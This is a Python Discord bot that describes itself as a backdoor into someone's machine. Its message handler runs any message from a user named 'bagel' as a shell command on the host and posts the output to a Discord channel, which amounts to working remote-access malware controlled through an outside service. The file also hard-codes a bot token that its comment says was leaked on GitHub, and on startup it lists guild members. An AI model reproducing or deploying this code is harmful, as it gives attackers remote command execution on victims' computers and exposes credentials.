import os, time, random, sys
os.system('pip3 install shlex')
import shlex
os.system("pip3 install -U discord.py")
os.system("pip3 install faker")
import discord
from discord.ext import commands
from discord.utils import get
import subprocess
token = "NzM0MjIy" + "Mzc3NjM4MT" + "Y2NjM4.Xx" + "Oj4A.j9T"+"5LbEGzw4urubKtDzPoSLfpL4" #obviously a fake token... just kidding, i was dumb enough to put a bot token into my code on github, someone politely used it to make my bot tell me to change it's token. to the person that did that, thank you, I had forgotten that I left this token sitting here. 
client = commands.Bot(command_prefix="!")
@client.event
async def on_ready():
	print("{} has connected".format(client.user))
	activity = discord.Game(name="Currently acting as a backdoor into someone's machine.")
	await client.change_presence(status=discord.Status.idle, activity=activity)

	for g in client.guilds:
		print(f"Active on: {g}")
		m = ""
		for x in g.members:
			m += x.name + ", "
		print(m)
@client.event
async def on_message(message):
	if "bagel" in message.author.name:
		x = subprocess.check_output(shlex.split(message.content))
		x2 = ''.join(str(x).replace("\\n", "\n"))
		print(x)
		print("----")
		print(x2)
		await message.channel.send(x2)

@client.event
async def on_member_join(member):
	print(member.name + " has joined " + member.guild.name)
client.run(token) 
